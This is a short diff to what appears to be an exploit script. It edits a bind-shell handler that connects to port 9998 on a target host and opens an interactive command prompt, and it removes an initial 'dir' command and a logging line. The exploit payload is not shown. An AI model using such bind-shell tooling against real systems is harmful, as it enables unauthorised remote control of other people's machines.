@@ -48,7 +48,7 @@ port=int(port)
 lport=int(lport)
 log.info("TARGET: "+target)
 log.info("PORT: "  +str(port))
-log.info("LPORT: " +str(lport)+"\n")
+#log.info("LPORT: " +str(lport)+"\n")
 log.info("Compiling exploit.")
 def BindHandler(x):
     t.sleep(1)
@@ -56,8 +56,6 @@ def BindHandler(x):
         s=socket.socket()
         s.connect((str(target),9998))
         log.success("Connected to bind port!")
-        s.send("dir")
-        a=s.recv(99999)
         prompt="Bind Prompt > " 
         while True:
             try:
